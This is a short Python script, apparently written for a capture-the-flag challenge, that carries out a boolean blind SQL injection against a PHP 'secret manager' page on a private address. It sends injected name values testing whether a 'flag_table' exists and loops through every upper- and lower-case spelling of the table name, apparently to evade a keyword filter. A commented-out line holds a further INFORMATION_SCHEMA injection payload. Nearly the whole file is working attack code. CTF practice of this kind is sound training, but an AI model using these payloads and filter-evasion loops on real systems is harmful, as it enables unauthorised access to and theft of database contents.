import os
import requests
import itertools

test = "Config correctly set"
def check(st):
    r = requests.get(st)
    if test in r.text:
        return True
    else:
        return False



#query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR IF(EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'flag_table'),'OK','NO')='OK"

query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR (SELECT COUNT(*) FROM 'flag_table') < 10000 OR '"
s = ' flag_table '
for combo in map(''.join, itertools.product(*zip(s.upper(), s.lower()))):
    q = query.replace("flag_table", combo)
    print(q)
    answer = check(q)
    if answer:
        print(combo)
        quit()




